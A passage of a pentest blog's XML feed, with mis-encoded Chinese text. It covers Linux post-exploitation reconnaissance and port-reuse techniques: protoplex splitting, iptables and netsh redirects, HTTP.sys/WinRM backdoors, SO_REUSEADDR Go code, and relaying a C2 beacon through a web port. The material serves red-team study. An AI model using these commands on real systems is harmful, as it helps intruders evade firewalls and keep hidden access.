href="https://todis21.github.io/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://todis21.github.io/2023/07/08/ThinkPHP-ä»£ç å®¡è®¡/</a></p><p><a href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://xz.aliyun.com/t/6106">https://xz.aliyun.com/t/6106</a></p><p><a href="https://y4er.com/posts/thinkphp5-rce/">https://y4er.com/posts/thinkphp5-rce/</a></p><p><a href="https://www.cnblogs.com/wkzb/p/14156026.html">https://www.cnblogs.com/wkzb/p/14156026.html</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html">https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-å¯&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-å¯&quot;&gt;&lt;/a&gt; 0x00 å¯&lt;/h1&gt;
&lt;p&gt;é»‘ç›’debugå¼€å¯ä¼šæŠ¥é”™å‡ºå…·ä½“ç‰ˆæœ¬&lt;/p&gt;
&lt;p&gt;ç™½ç›’çœ‹æœ¬åœ°tpä»£ç &lt;/p&gt;
&lt;p&gt;tp3 åœ¨ç›®å½•çš„ThinkPHPæ–‡ä»¶</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>Linuxåæ¸—é€ç ”ç©¶--Linuxç‰¹æ€§åˆ©ç”¨å’Œæé™åœºæ™¯å¤„ç†</title>
    <link href="https://cyxsec.github.io/2023/04/Linux%E5%90%8E%E6%B8%97%E9%80%8F%E7%A0%94%E7%A9%B6--Linux%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8%E5%92%8C%E6%9E%81%E9%99%90%E5%9C%BA%E6%99%AF%E5%A4%84%E7%90%86/"/>
    <id>https://cyxsec.github.io/2023/04/Linux%E5%90%8E%E6%B8%97%E9%80%8F%E7%A0%94%E7%A9%B6--Linux%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8%E5%92%8C%E6%9E%81%E9%99%90%E5%9C%BA%E6%99%AF%E5%A4%84%E7%90%86/</id>
    <published>2023-04-29T03:28:25.000Z</published>
    <updated>2024-07-22T08:47:26.263Z</updated>
    
    <content type="html"><![CDATA[<p>Linuxæ¸—é€çš„æ—¶å€™è¦ç†è§£å’Œæ¥å—ä¸€ä¸ªæ¦‚å¿µï¼šLinuxä¸€åˆ‡çš†æ–‡ä»¶</p><p><strong>ç®€å•è®°å½•ä¸€ä¸‹æ¸—é€ä¸­åˆ©ç”¨çš„Linuxç‰¹æ€§ã€åæ¸—é€çš„æé™åœºæ™¯å¤„ç†</strong></p><p>Linuxä¸åŒå‘è¡Œç‰ˆæœ‰ä»–ä»¬è‡ªå·±çš„ç‰¹æ€§ï¼Œè¿™äº›ç‰¹æ€§åœ¨æ¸—é€å’Œåæ¸—é€ä¸­éƒ½å¯ä»¥ç”¨åˆ°</p><h2 id="0x01æŸ¥çœ‹ç³»ç»Ÿipä¿¡æ¯"><a class="markdownIt-Anchor" href="#0x01æŸ¥çœ‹ç³»ç»Ÿipä¿¡æ¯"></a> 0x01æŸ¥çœ‹ç³»ç»Ÿipä¿¡æ¯</h2><ul><li>é˜‰å‰² ip aã€ifconfig</li></ul><p>åœ¨<strong>éDHCP</strong>æƒ…å†µä¸‹ï¼Œä¸åŒå‘è¡Œç‰ˆåœ¨æœ¬åœ°æ–‡ä»¶å¯ä»¥æ‰¾åˆ°ipé…ç½®ä¿¡æ¯</p><p>RHEL/CentOSç³»</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-&lt;interface&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240429114106822.png" alt="image-20240429114106822" /></p><p>Debianç³»</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;network&#x2F;interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…¶ä»–ï¼š</p><ul><li>æŸ¥çœ‹arpè¡¨</li><li>hostname -I</li><li>ç«¯å£è¿æ¥ä¿¡æ¯</li></ul><h2 id="0x02æŸ¥çœ‹ç«¯å£è¿æ¥ä¿¡æ¯"><a class="markdownIt-Anchor" href="#0x02æŸ¥çœ‹ç«¯å£è¿æ¥ä¿¡æ¯"></a> 0x02æŸ¥çœ‹ç«¯å£è¿æ¥ä¿¡æ¯</h2><p>/proc/net ä¸‹é¢çš„tcpå’Œudpæ–‡ä»¶ä¼šå­˜å‚¨ç½‘ç»œç«¯å£è¿æ¥æƒ…å†µ</p><p><img src="../../../typora-user-images/image-20240527102511919.png" alt="image-20240527102511919" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Linuxæ¸—é€çš„æ—¶å€™è¦ç†è§£å’Œæ¥å—ä¸€ä¸ªæ¦‚å¿µï¼šLinuxä¸€åˆ‡çš†æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç®€å•è®°å½•ä¸€ä¸‹æ¸—é€ä¸­åˆ©ç”¨çš„Linuxç‰¹æ€§ã€åæ¸—é€çš„æé™åœºæ™¯å¤„ç†&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Linuxä¸åŒå‘è¡Œç‰ˆæœ‰ä»–ä»¬è‡ªå·±çš„ç‰¹æ€§ï¼Œè¿™äº›ç‰¹æ€§åœ¨æ¸—é€å’Œåæ¸—é€ä¸­éƒ½å¯ä»¥ç”¨åˆ°&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    
    <category term="åæ¸—é€" scheme="https://cyxsec.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ç«¯å£å¤ç”¨æŠ€æœ¯</title>
    <link href="https://cyxsec.github.io/2022/08/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%8A%80%E6%9C%AF/"/>
    <id>https://cyxsec.github.io/2022/08/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%8A%80%E6%9C%AF/</id>
    <published>2022-08-03T03:16:57.000Z</published>
    <updated>2024-07-22T08:44:46.829Z</updated>
    
    <content type="html"><![CDATA[<p>å¾ˆå¤šæƒ…å†µä¸‹é‡åˆ°æ— æ³•è§£æwebshellç¯å¢ƒï¼ˆpythonä¹‹ç±»çš„rceï¼‰ï¼Œæˆ–å†…ç½‘ç¯å¢ƒé‡åˆ°å¼ºéš”ç¦»ï¼Œé™å®šäº†é€šè®¯ç«¯å£ã€‚</p><p>ç«¯å£å¤ç”¨å·¥ä½œä¸­ç”¨çš„ä¸ç®—å¤ªå¤šï¼Œä¸»è¦æ˜¯è€ƒè™‘å®¢æˆ·ä¸šåŠ¡çš„ç¨³å®šæ€§ï¼Œå¯¼è‡´å¾ˆå¤šæ—¶å€™ä¸å¤ªæ•¢ä¸Šç«¯å£å¤ç”¨ã€‚</p><p>ç«¯å£å¤ç”¨æ ¹æ®ä¸åŒåœºæ™¯æœ‰ä¸åŒçš„å®ç°æ–¹æ¡ˆï¼Œä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹ã€‚</p><p><strong>å…·ä½“çš„æ¦‚å¿µå¯ä»¥ç›´æ¥çœ‹è¿™ç¯‡ï¼Œè®²çš„ååˆ†è¯¦ç»†ï¼Œåœ¨ç½‘ä¸Šæœäº†å¾ˆå¤šç¯‡ï¼Œ æ„Ÿè§‰éƒ½æ˜¯æŠ„çš„è¿™ç¯‡ï¼Œå†™çš„ç¡®å®å¥½</strong>ï¼š<a href="http://mobile.51cto.com/hot-557084.html">http://mobile.51cto.com/hot-557084.html</a></p><h2 id="0x01åŸºäºç«¯å£è½¬å‘åè®®åˆ†æµçš„ç«¯å£å¤ç”¨"><a class="markdownIt-Anchor" href="#0x01åŸºäºç«¯å£è½¬å‘åè®®åˆ†æµçš„ç«¯å£å¤ç”¨"></a> 0x01åŸºäºç«¯å£è½¬å‘+åè®®åˆ†æµçš„ç«¯å£å¤ç”¨</h2><p>é…ç½®è¿‡ç¨‹å¤§æ¦‚æ˜¯ï¼š</p><ul><li>ä½¿ç”¨åˆ†æµå·¥å…·ï¼Œç›‘å¬æœ¬åœ°9999ç«¯å£çš„æµé‡ï¼Œæ ¹æ®åè®®åšåˆ†æµåŒºåˆ†ï¼Œå¦‚æ­£å¸¸çš„httpåè®®ä¾ç„¶æŒ‰ç…§æ­£å¸¸çš„ä¸šåŠ¡é€»è¾‘è½¬å‘åˆ°80ç«¯å£ï¼Œå…¶ä»–æˆ‘ä»¬æŒ‡å®šçš„åè®®å°±å¯ä»¥è½¬å‘åˆ°æˆ‘ä»¬å®é™…çš„åˆ©ç”¨ç«¯å£ï¼Œå³å¯å®Œæˆç«¯å£å¤ç”¨ã€‚</li></ul><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;Pandentia&#x2F;protoplexè¿™æ˜¯ä¸€ä¸ªåè®®å¤ç”¨çš„å·¥å…·ï¼Œæ¯”å¦‚å‘½ä»¤å¯å°†æœ¬åœ°9999ç«¯å£çš„æµé‡æ ¹æ®åè®®ç±»å‹è½¬åˆ°æœ¬åœ°çš„2333å’Œ80ç«¯å£ã€‚æ³¨: åœ¨å®æˆ˜ç¯å¢ƒä¸­ï¼Œå…ˆç”¨protoplexè¿›è¡Œåˆ†æµï¼Œç„¶åå†è¿›è¡Œé‡å®šå‘ã€‚.&#x2F;protoplex --socks5 192.168.154.130:2333 --http 127.0.0.1:80 -b 192.168.154.130:9999æ³¨: protoplexè®¾ç½®åˆ†æµçš„httpåè®®IPå’Œé‡å®šå‘çš„ipä¸è¦è®¾ç½®ä¸ºåŒä¸€ä¸ªip,å¦åˆ™ä¼šå½¢æˆé—­ç¯ã€‚åŒæ—¶è¯¥å·¥å…·è¿˜æ”¯æŒå…¶ä»–åè®®çš„åˆ†æµï¼Œå¦‚ï¼š    SSH    HTTP    TLS (&#x2F; HTTPS)    OpenVPN    SOCKS4 &#x2F; SOCKS5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>åˆ©ç”¨netshï¼ˆwinï¼‰å’Œiptables ï¼ˆLinuxï¼‰é…ç½®ç«¯å£è½¬å‘ç­–ç•¥ï¼Œå°†è¯·æ±‚æœåŠ¡å™¨80ç«¯å£çš„æµé‡è½¬å‘åˆ°æœ¬åœ°çš„9999ç«¯å£ï¼ˆå¯¹åº”ç›‘å¬å³å¯ï¼‰</p><pre class="line-numbers language-none"><code class="language-none">linuxå°†è®¿é—®80çš„æµé‡é‡å®šå‘åˆ°9999ç«¯å£sudo iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 9999windowså°†æœ¬åœ°80æµé‡é‡å®šå‘åˆ°9999netsh interface portproxy add v4tov4 listenport&#x3D;80 listenaddress&#x3D;192.168.154.129 connectport&#x3D;9999 connectaddress&#x3D;192.168.154.129<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤§è‡´è¿‡ç¨‹å¦‚ä¸‹ï¼š</p></li></ul><p><img src="../../../typora-user-images/image-20240704171847360.png" alt="image-20240704171847360" /></p><p>å®æˆ˜ä¸­æœ‰ä¸€äº›httpçš„webï¼Œå°±å¯ä»¥è®¾ç½®httpsçš„ä¸Šçº¿beaconï¼Œé€šè¿‡æ­¤æ–¹å¼è¿›è¡Œä¸­è½¬ä¸Šçº¿ã€‚</p><p><strong>yyä¸€å¥ï¼Œç†è®ºä¸Šä¸å•å•å¯ä»¥æ ¹æ®åè®®åŒºåˆ†ï¼Œåè®®åªæ˜¯ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„ç‰¹å¾ï¼ŒåŒºåˆ†ä¸åŒçš„æ•°æ®åŒ…ï¼Œåœ¨åè®®ç›¸åŒçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥åšåˆ°ç«¯å£å¤ç”¨ï¼Œæ˜¯ç†è®ºä¸Šçš„æ€è·¯ï¼Œæ²¡æ‰¾åˆ°ç°æˆçš„å·¥å…·</strong></p><h2 id="0x02åŸºäºhttpsys-winrm-ç«¯å£å¤ç”¨"><a class="markdownIt-Anchor" href="#0x02åŸºäºhttpsys-winrm-ç«¯å£å¤ç”¨"></a> 0x02åŸºäºHTTP.sys + Winrm ç«¯å£å¤ç”¨</h2><p>é¦–å…ˆæ˜ç¡®æ¦‚å¿µ</p><p>HTTP.sysæ˜¯iisçš„é©±åŠ¨ï¼Œiisä¸­ä¸åŒåº”ç”¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ç«¯å£ï¼Œè¿™ä¹Ÿæ˜¯å…¶é©±åŠ¨çš„å·¥ä½œåŸç†ï¼Œå¯ä»¥æ ¹æ®æ³¨å†Œçš„URLå‰ç¼€ï¼Œå°†è¯·æ±‚åˆ†å‘åˆ°ä¸åŒåº”ç”¨ï¼Œä¹Ÿå°±å®ç°äº†ç«¯å£å¤ç”¨ã€‚ï¼ˆå…¶å®å’Œåå‘ä»£ç†å·®ä¸å¤šï¼‰</p><p>WinrmæœåŠ¡ï¼Œè¿™ä¸ªæˆ‘ä»¬åœ¨å†…ç½‘æ¸—é€ä¸­ç”¨çš„æ¯”è¾ƒå¤šï¼Œè¿™ä¸ªæœåŠ¡åœ¨2012åŠå…¶ä»¥åçš„æœºå™¨é»˜è®¤å¼€æ”¾ï¼Œä»–æœ¬è´¨ä¸Šå°±æ˜¯åœ¨<strong>HTTP.sysä¸Šæ³¨å†Œäº†wsmançš„URLå‰ç¼€ï¼Œé»˜è®¤ç›‘å¬ç«¯å£5985</strong>ï¼Œæ‰€ä»¥ä¹Ÿèƒ½ç†è§£ä¸ºä»€ä¹ˆwinrmé»˜è®¤èµ°çš„httpåè®®ã€‚</p><p>æ‰€ä»¥è¿™ä¸ªå¤ç”¨ä¹Ÿå°±å¾ˆå¥½ç†è§£äº†ï¼Œ<em>é…ç½®å¥½winrmï¼Œå°±èƒ½åœ¨webæœåŠ¡è¿æ¥winrmæœåŠ¡ã€‚</em></p><p>è¿™ä¸ªå¤ç”¨æœ€ç»ˆçš„æ•ˆæœå°±æ˜¯ä½¿ç”¨winrmæœåŠ¡ï¼ŒwinrmæœåŠ¡çš„ç‰¹ç‚¹æˆ‘ä»¬æå†…ç½‘å¤šä¹ŸçŸ¥é“æ¨ªå‘ç§»åŠ¨å¯ä»¥ä½¿ç”¨è¯¥ç«¯å£è®¤è¯æ‰§è¡Œå‘½ä»¤ï¼ˆæ­¤è¿‡ç¨‹æ— æ–‡ä»¶è½åœ°ï¼‰ã€‚</p><p>ç›®å‰èƒ½æƒ³åˆ°çš„åº”ç”¨ç‚¹ï¼š</p><ul><li>æ¨ªå‘ç§»åŠ¨/åé—¨</li><li>åº”å¯¹æç«¯ç¯å¢ƒä¸‹çš„æ¸—é€æµ‹è¯•ä»»åŠ¡ï¼ˆé˜²ç«å¢™ç­–ç•¥é…ç½®å¾ˆæ­»ã€å¼ºç»ˆç«¯å¯¹æŠ—ï¼Œå¦‚ï¼šæ— æ³•è½åœ°æ–‡ä»¶</li></ul><p>ç†è§£æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ï¼Œè¿™é‡Œçš„winrmæœåŠ¡æˆ‘ä»¬ä¹Ÿèƒ½ç†è§£æ˜¯ä¸ªä»£æŒ‡ï¼Œwinrmæ˜¯windowsè‡ªå¸¦çš„ï¼Œæˆ‘ä»¬å®æˆ˜ä¸€æ ·å¯ä»¥è‡ªå®ç°è°ƒç”¨è¿™ç§http.sysé©±åŠ¨æœºåˆ¶çš„APIæ¥å£ï¼Œæœ€ç»ˆå®ç°ä¸€ä¸ªç±»winrmæœåŠ¡åšåé—¨ã€‚ï¼ˆwebshellç­‰ï¼Œåˆå›åˆ°äº†ä¸Šé¢çš„æ­£å‘HTTPéš§é“ï¼‰</p><p>å¤§æ¦‚å°±æ˜¯ï¼š<a href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/UsePipeToExeCmd.cpp">https://github.com/3gstudent/Homework-of-C-Language/blob/master/UsePipeToExeCmd.cpp</a></p><p>ä¸‰å¥½å­¦ç”Ÿå†™çš„æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œé‚£ç†è®ºä¸Šåº”è¯¥ä¹Ÿå¯ä»¥åšæ­£å‘httpéš§é“ï¼Ÿä½†ç›®å‰æ²¡æ‰¾åˆ°ç°æˆçš„å·¥å…·ï¼Œåé¢å®æˆ˜ç”¨åˆ°å†è€ƒè™‘ã€‚</p><h2 id="0x03åŸºäºsocketç»‘å®šç‰¹æ€§çš„ç«¯å£å¤ç”¨"><a class="markdownIt-Anchor" href="#0x03åŸºäºsocketç»‘å®šç‰¹æ€§çš„ç«¯å£å¤ç”¨"></a> 0x03åŸºäºsocketç»‘å®šç‰¹æ€§çš„ç«¯å£å¤ç”¨</h2><p>æˆ‘ä»¬çŸ¥é“ï¼Œä¸€èˆ¬æ¥è¯´åœ¨æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªæ–°çš„ç«¯å£ï¼Œå¦‚æœå½“å‰ç«¯å£å·²è¢«å ç”¨ï¼Œå°±ä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯ã€‚</p><pre class="line-numbers language-none"><code class="language-none">Error: listen tcp 127.0.0.1:8080: bind: Only one usage of each socket address (protocol&#x2F;network address&#x2F;port) is normally permitted.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ç¼ºçœæ¡ä»¶ä¸‹ï¼Œä¸€ä¸ªå¥—æ¥å£ä¸èƒ½ä¸ä¸€ä¸ªå·²åœ¨ä½¿ç”¨ä¸­çš„æœ¬åœ°åœ°å€æ†ç»‘ï¼ˆbind())ï¼‰ã€‚ä½†æœ‰æ—¶ä¼šéœ€è¦â€œé‡ç”¨â€åœ°å€ã€‚å› ä¸ºæ¯ä¸€ä¸ªè¿æ¥éƒ½ç”±æœ¬åœ°åœ°å€å’Œè¿œç«¯åœ°å€çš„ç»„åˆå”¯ä¸€ç¡®å®šï¼Œæ‰€ä»¥åªè¦è¿œç«¯åœ°å€ä¸åŒï¼Œä¸¤ä¸ªå¥—æ¥å£ä¸ä¸€ä¸ªåœ°å€æ†ç»‘å¹¶æ— å¤§ç¢ã€‚ä¸ºäº†é€šçŸ¥å¥—æ¥å£å®ç°ä¸è¦å› ä¸ºä¸€ä¸ªåœ°å€å·²è¢«ä¸€ä¸ªå¥—æ¥å£ä½¿ç”¨å°±ä¸è®©å®ƒä¸å¦ä¸€ä¸ªå¥—æ¥å£æ†ç»‘ã€‚</p><p>ç„¶è€Œï¼Œæ ¹æ®TCP/IPæ ‡å‡†ï¼Œç«¯å£æœ¬èº«æ˜¯å…è®¸å¤ç”¨çš„ã€‚ç»‘å®šç«¯å£çš„æœ¬è´¨æ˜¯ï¼Œå½“ç³»ç»Ÿæ¥æ”¶åˆ°ä¸€ä¸ªTCPæŠ¥æ–‡æ®µæˆ–UDPæ•°æ®æŠ¥æ—¶ï¼Œå¯ä»¥æ ¹æ®å…¶å¤´éƒ¨çš„ç«¯å£å­—æ®µæ‰¾åˆ°å¯¹åº”çš„è¿›ç¨‹ï¼Œå¹¶å°†æ•°æ®ä¼ é€’ç»™ç›¸åº”çš„è¿›ç¨‹ã€‚å¤šä¸ªä¸šåŠ¡å…±ç”¨åŒä¸€ä¸ªç«¯å£çš„æƒ…å†µä¸‹å…¶å®å¾ˆå¸¸è§</p><p>åœ¨è¿™ä¸ªèƒŒæ™¯ä¸‹ï¼Œ<code>SO_REUSEPORT</code> å’Œ <code>SO_REUSEADDR</code> æ˜¯ä¸¤ä¸ªå¥—æ¥å­—é€‰é¡¹ï¼Œå®ƒä»¬å…è®¸åœ¨ç‰¹å®šæƒ…å†µä¸‹é‡æ–°ä½¿ç”¨ç«¯å£ï¼š</p><ul><li><strong>SO_REUSEPORTï¼š</strong> å…è®¸å¤šä¸ªå¥—æ¥å­—åŒæ—¶ç»‘å®šåˆ°ç›¸åŒçš„åœ°å€å’Œç«¯å£ï¼Œå¯ä»¥åŒæ—¶æ¥æ”¶ä¼ å…¥çš„è¿æ¥ï¼Œé€‚ç”¨äºå®ç°è´Ÿè½½å‡è¡¡æˆ–è€…å¤šè¿›ç¨‹/çº¿ç¨‹åŒæ—¶ç›‘å¬åŒä¸€ç«¯å£çš„åœºæ™¯ã€‚</li><li><strong>SO_REUSEADDRï¼š</strong> å…è®¸åœ¨ä¸€ä¸ªå¥—æ¥å­—ä½¿ç”¨è¿‡ç¨‹ä¸­è¢«ç»ˆæ­¢åï¼Œå…¶ä»–å¥—æ¥å­—å¯ä»¥ç«‹å³å†æ¬¡ç»‘å®šåˆ°ç›¸åŒçš„åœ°å€å’Œç«¯å£ï¼Œæœ‰åŠ©äºåœ¨æœåŠ¡å™¨é‡å¯åå¿«é€Ÿæ¢å¤æœåŠ¡ã€‚</li></ul><p>æˆ‘ä»¬åœ¨å»ºç«‹socketè¿æ¥æ—¶ï¼ŒæŒ‡å®šå¥½è¿™ä¸¤ä¸ªå‚æ•°ï¼Œå°±å¯ä»¥é‡æ–°ä½¿ç”¨å·²ç»ç»‘å®šçš„ç«¯å£ï¼Œå®Œæˆç«¯å£å¤ç”¨äº†ã€‚</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> lc <span class="token operator">=</span> net<span class="token punctuation">.</span>ListenConfig<span class="token punctuation">&#123;</span>Control<span class="token punctuation">:</span> <span class="token keyword">func</span><span class="token punctuation">(</span>network<span class="token punctuation">,</span> address <span class="token builtin">string</span><span class="token punctuation">,</span> c syscall<span class="token punctuation">.</span>RawConn<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> opErr <span class="token builtin">error</span><span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Control</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>fd <span class="token builtin">uintptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>opErr <span class="token operator">=</span> windows<span class="token punctuation">.</span><span class="token function">SetsockoptInt</span><span class="token punctuation">(</span>windows<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">,</span> windows<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> windows<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">return</span> opErr<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼ºç‚¹ï¼šiisæ— æ³•å¤ç”¨ï¼ˆiis5ä»¥ä¸‹å¯ä»¥ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ä¸Šé¢HTTP.sysçš„æ–¹æ³•ï¼‰ã€3389æ— æ³•å¤ç”¨ï¼ˆRDPå¯ä»¥è€ƒè™‘é‡‡ç”¨éš§é“æ–¹å¼ï¼š<a href="https://github.com/nccgroup/SocksOverRDP%EF%BC%89">https://github.com/nccgroup/SocksOverRDPï¼‰</a></p><h3 id="socketå¤ç”¨æŠ€æœ¯ç¼ºç‚¹"><a class="markdownIt-Anchor" href="#socketå¤ç”¨æŠ€æœ¯ç¼ºç‚¹"></a> socketå¤ç”¨æŠ€æœ¯ç¼ºç‚¹</h3><p>ç†è®ºå¾ˆä¸°æ»¡ï¼Œç°å®ä¼—æ˜¯å¦çœŸçš„è¿™ä¹ˆç®€å•å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬è®¾ç½®socketçš„SO_REUSEADDRå‚æ•°å¹¶ä¸ä¸€å®šå…¶ä½œç”¨</p><ul><li>ç¨‹åºç¼–å†™äººå‘˜ socket åœ¨ç»‘å®šå‰éœ€è¦ä½¿ç”¨ setsockopt æŒ‡å®š SO_EXCLUSIVEADDRUSE   è¦æ±‚ç‹¬å æ‰€æœ‰çš„ç«¯å£åœ°å€ï¼Œè€Œä¸å…è®¸å¤ç”¨ã€‚è¿™æ ·å…¶å®ƒäººå°±æ— æ³•å¤ç”¨è¿™ä¸ªç«¯å£äº†ï¼Œå³ä½¿ä½ è®¾ç½®äº† socket ä¸º SO_REUSEADDR   ä¹Ÿæ²¡æœ‰ç”¨ï¼Œç¨‹åºæ ¹æœ¬è·‘ä¸èµ·æ¥ã€‚</li><li>iisæ— æ³•å¤ç”¨</li></ul><p><img src="../../../typora-user-images/image-20240715154737649.png" alt="image-20240715154737649" /></p><h2 id="0x04åŸºäºé©±åŠ¨çš„ç«¯å£å¤ç”¨"><a class="markdownIt-Anchor" href="#0x04åŸºäºé©±åŠ¨çš„ç«¯å£å¤ç”¨"></a> 0x04åŸºäºé©±åŠ¨çš„ç«¯å£å¤ç”¨</h2><p>ä½¿ç”¨é©±åŠ¨ç¨‹åºè¿›è¡Œç«¯å£å¤ç”¨å’Œè½¬å‘ï¼š</p><p><a href="https://github.com/Arno0x/DivertTCPconn">https://github.com/Arno0x/DivertTCPconn</a></p><p><a href="https://github.com/praetorian-inc/PortBender">https://github.com/praetorian-inc/PortBender</a></p><p>åŸç†ä¹‹åæœ‰ç²¾åŠ›å†å»åˆ†æ</p><h2 id="0x05-å‚è€ƒè¿æ¥"><a class="markdownIt-Anchor" href="#0x05-å‚è€ƒè¿æ¥"></a> 0x05 å‚è€ƒè¿æ¥ï¼š</h2><p>ï¼ˆfrsocks+protoplex+æµé‡é‡å®šå‘å®ç°ç«¯å£å¤ç”¨ï¼‰<a href="https://uknowsec.cn/posts/notes/frsocks+protoplex+%E6%B5%81%E9%87%8F%E9%87%8D%E5%AE%9A%E5%90%91%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8.html">https://uknowsec.cn/posts/notes/frsocks+protoplex+æµé‡é‡å®šå‘å®ç°ç«¯å£å¤ç”¨.html</a></p><p>ï¼ˆä¸€æ¡å‘½ä»¤å®ç°ç«¯å£å¤ç”¨åé—¨ï¼‰<a href="https://paper.seebug.org/1004/">https://paper.seebug.org/1004/</a></p><p>ï¼ˆåˆ©ç”¨IISçš„ç«¯å£å…±äº«åŠŸèƒ½ç»•è¿‡é˜²ç«å¢™ï¼‰<a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99">https://3gstudent.github.io/åˆ©ç”¨IISçš„ç«¯å£å…±äº«åŠŸèƒ½ç»•è¿‡é˜²ç«å¢™</a></p><p>ï¼ˆæ¢ç´¢åŸºäºHTTP.SYSå®ç°æƒé™ç»´æŒï¼‰<a href="https://c1y2m3.github.io/2019/11/21/%E6%8E%A2%E7%B4%A2%E5%9F%BA%E4%BA%8EHTTP.SYS%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">https://c1y2m3.github.io/2019/11/21/æ¢ç´¢åŸºäºHTTP.SYSå®ç°æƒé™ç»´æŒ/</a></p><p><a href="https://github.com/p1d3er/port_reuse">https://github.com/p1d3er/port_reuse</a></p><p>ï¼ˆèŠèŠç«¯å£å¤ç”¨çš„å®ç°å’Œå‘ç‚¹ï¼‰<a href="http://mobile.51cto.com/hot-557084.html">http://mobile.51cto.com/hot-557084.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¾ˆå¤šæƒ…å†µä¸‹é‡åˆ°æ— æ³•è§£æwebshellç¯å¢ƒï¼ˆpythonä¹‹ç±»çš„rceï¼‰ï¼Œæˆ–å†…ç½‘ç¯å¢ƒé‡åˆ°å¼ºéš”ç¦»ï¼Œé™å®šäº†é€šè®¯ç«¯å£ã€‚&lt;/p&gt;
&lt;p&gt;ç«¯å£å¤ç”¨å·¥ä½œä¸­ç”¨çš„ä¸ç®—å¤ªå¤šï¼Œä¸»è¦æ˜¯è€ƒè™‘å®¢æˆ·ä¸šåŠ¡çš„ç¨³å®šæ€§ï¼Œå¯¼è‡´å¾ˆå¤šæ—¶å€™ä¸å¤ªæ•¢ä¸Šç«¯å£å¤ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ç«¯å£å¤ç”¨æ ¹æ®ä¸åŒåœºæ™¯æœ‰ä¸åŒçš„å®ç°æ–¹æ¡ˆï¼Œä¸‹é¢ç®€å•</summary>
      
    
    
    
    
    <category term="ç«¯å£å¤ç”¨" scheme="https://cyxsec.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>ä¸å‡ºç½‘C2ä¸Šçº¿</title>
